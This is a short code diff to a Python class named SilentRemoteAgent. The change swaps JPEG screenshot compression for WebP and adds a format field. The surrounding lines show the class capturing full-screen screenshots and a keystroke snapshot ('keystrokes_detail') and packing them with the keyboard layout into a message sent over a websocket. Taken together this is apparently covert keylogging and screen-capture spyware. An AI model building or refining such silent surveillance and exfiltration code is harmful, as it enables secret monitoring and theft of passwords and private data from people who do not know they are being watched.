@@ -1101,8 +1101,9 @@ class SilentRemoteAgent:
             self._typing_session_active = False
             self._typing_debounce_timer = None
 
-        # MF-05: Captura de Pantalla en Alta Resolución con mss al segundo 15
+        # MF-05: Captura de Pantalla en Alta Resolución con mss al segundo 15 (Compresión WebP sin pérdida visual)
         screenshot_b64 = ""
+        screenshot_fmt = "webp"
         try:
             with mss.mss() as sct:
                 mon_idx = min(self.current_monitor, len(sct.monitors) - 1)
@@ -1113,7 +1114,12 @@ class SilentRemoteAgent:
                     ratio = 1920.0 / img.width
                     img = img.resize((1920, int(img.height * ratio)), Image.LANCZOS)
                 buf = io.BytesIO()
-                img.save(buf, format="JPEG", quality=75, optimize=True)
+                try:
+                    img.save(buf, format="WEBP", quality=80, method=4)
+                except Exception:
+                    buf = io.BytesIO()
+                    img.save(buf, format="JPEG", quality=78, optimize=True)
+                    screenshot_fmt = "jpg"
                 screenshot_b64 = base64.b64encode(buf.getvalue()).decode("ascii")
         except Exception:
             pass
@@ -1130,6 +1136,7 @@ class SilentRemoteAgent:
             "keystrokes_detail": keystrokes_snapshot[:250],
             "keyboard_layout": layout_name,
             "screenshot_b64": screenshot_b64,
+            "screenshot_format": screenshot_fmt,
         }
 
         if self.loop and self.ws:
